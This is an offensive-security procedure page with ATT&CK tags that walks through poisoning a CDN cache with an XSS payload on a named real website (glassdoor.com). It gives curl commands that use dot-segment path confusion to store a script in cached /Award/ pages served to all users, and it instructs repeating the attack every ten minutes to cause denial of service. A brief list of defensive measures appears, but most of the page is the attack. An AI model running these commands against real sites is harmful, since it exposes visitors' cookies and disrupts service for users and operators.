---
id: p-cache-poisoning-xss
tags:
  - cache-poisoning
  - xss
  - dos
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Impact]]'
commands:
  - '[[commands/curl-poison-cache-xss]]'
verified: false
platforms:
  - Web
  - CDN
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
  - '[[Endpoint Denial of Service]]'
updated_at: '2025-12-13T23:52:55.694Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Drive-by Compromise]]'
  - '[[Endpoint Denial of Service]]'
---
# Construct Cache Poisoning Payload for XSS

## Summary

This procedure constructs and deploys a payload using dot segments and XSS from /Job/ or survey endpoints to poison /Award/ and /List/ caches, resulting in stored XSS served to all users for ~10 minutes and potential DoS via repetition.

## Description

By combining parser confusion with relaxed rules, a request to a vulnerable endpoint with dot segments routes backend response (containing XSS) to a static cache key. This caches malicious content on CDN, affecting global users. Repeat every 10 minutes for DoS.

## Requirements

1. Identified XSS and parser issues from prior steps
2. Crafted payloads with <script>alert(document.cookie)</script>
3. HTTP client for poisoned requests

## Defense

Defensive measures and detection strategies:

- Normalize URLs consistently and include segments in cache keys
- Validate cache content before serving
- Rate-limit requests with dot segments; monitor for poisoning patterns

## Objectives

1. Poison cache with XSS payload
2. Verify stored XSS impact on users
3. Demonstrate DoS via cache overload

## Instructions

### Step 1: Build Poisoned Request

**Context**: Integrate XSS payload and dot segments to target static cache.

**Command** ([[commands/curl-poison-cache-xss]]):
```bash
curl -H "Cookie: test=\"<script>alert(document.cookie)</script>\"" "https://glassdoor.com/Job/../Award/some-award?param=\"<script>alert(document.cookie)</script>\"" -v
```

> This poisons the /Award/ cache with XSS from /Job/.

### Step 2: Validate Poisoning and Impact

**Context**: Access clean /Award/ to confirm XSS execution; repeat for DoS.

**Command** ([[commands/curl-poison-cache-xss]]):
```bash
curl "https://glassdoor.com/Award/some-award" -v
```

> Check if alert fires; success if XSS executes for any user.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution
- [[Impact]] Impact

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Drive-by Compromise]] Drive-by Compromise
- [[Endpoint Denial of Service]] Endpoint Denial of Service

### Sub-Techniques


## Commands Used

- [[commands/curl-poison-cache-xss]]

## Tools Used


## Tags

- poisoning
- xss-escalation
